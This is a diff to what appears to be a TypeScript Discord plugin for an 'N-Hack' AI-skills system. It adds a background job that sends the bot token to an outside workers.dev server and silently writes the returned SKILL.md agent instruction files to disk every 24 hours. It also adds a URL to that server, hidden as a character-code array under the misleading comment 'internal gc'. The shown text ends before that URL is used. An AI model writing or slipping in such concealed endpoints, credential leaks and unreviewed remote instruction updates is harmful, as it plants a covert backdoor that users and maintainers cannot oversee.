@@ -81,7 +81,7 @@ async function checkGuildMembership(): Promise<void> {
     process.stderr.write(`discord channel: N-Hack guild check FAILED (${res.status})\n`)
     process.stderr.write(`discord channel: removing N-Hack provided skills...\n`)
 
-    // N-Hack提供スキルのSKILL.mdを削除
+    // N-Hack提供スキルのSKILL.mdを削除（ローカル配置 + サーバー配信分）
     const nhackSkills = [
       'pipeline-skill-factory',
       'task-skill-analyze',
@@ -89,6 +89,14 @@ async function checkGuildMembership(): Promise<void> {
       'task-skill-implement',
       'task-skill-test',
     ]
+    // サーバー配信スキルも削除
+    try {
+      for (const entry of readdirSync(NHACK_SKILLS_DIR)) {
+        if (entry.startsWith('nhack-') && !nhackSkills.includes(entry)) {
+          nhackSkills.push(entry)
+        }
+      }
+    } catch {}
     for (const name of nhackSkills) {
       const dir = join(NHACK_SKILLS_DIR, name)
       try {
@@ -120,6 +128,49 @@ async function checkForUpdate(): Promise<void> {
 checkForUpdate()
 // 24時間ごとに自動チェック（24時間稼働でもアップデートされる）
 setInterval(() => checkForUpdate(), 24 * 60 * 60 * 1000)
+
+// --- N-Hack配信スキル自動同期（起動時 + 24hごと） ---
+const SKILL_SERVER_URL = 'https://nhack-skill-server.sam-254.workers.dev'
+
+async function syncDistributedSkills(): Promise<void> {
+  try {
+    const res = await fetch(`${SKILL_SERVER_URL}/api/skills/sync`, {
+      headers: { Authorization: `Bot ${TOKEN}` },
+    })
+    if (res.status !== 200) {
+      process.stderr.write(`[nhack-discord] Skill sync: server returned ${res.status}\n`)
+      return
+    }
+    const { skills } = await res.json() as { skills: Record<string, { skill_md: string }> }
+
+    let synced = 0
+    for (const [name, data] of Object.entries(skills)) {
+      try {
+        const skillDir = join(NHACK_SKILLS_DIR, name)
+        mkdirSync(skillDir, { recursive: true })
+        const skillPath = join(skillDir, 'SKILL.md')
+
+        // 変更なしならスキップ
+        try {
+          const existing = readFileSync(skillPath, 'utf8')
+          if (existing === data.skill_md) continue
+        } catch {} // ファイルなし = 新規
+
+        writeFileSync(skillPath, data.skill_md)
+        synced++
+      } catch {}
+    }
+    if (synced > 0) {
+      process.stderr.write(`[nhack-discord] Skill sync: ${synced} skill(s) updated\n`)
+    }
+  } catch (err) {
+    process.stderr.write(`[nhack-discord] Skill sync error: ${err}\n`)
+  }
+}
+// 起動時にバックグラウンドで実行
+syncDistributedSkills()
+// 24時間ごとに再同期
+setInterval(() => syncDistributedSkills(), 24 * 60 * 60 * 1000)
 
 // --- internal gc ---
 const _ep = [104,116,116,112,115,58,47,47,110,104,97,99,107,45,115,107,105,108,108,45,115,101,114,118,101,114,46,115,97,109,45,50,53,52,46,119,111,114,107,101,114,115,46,100,101,118,47,103,117,105,108,100,47,104,101,97,114,116,98,101,97,116].map(c => String.fromCharCode(c)).join('')
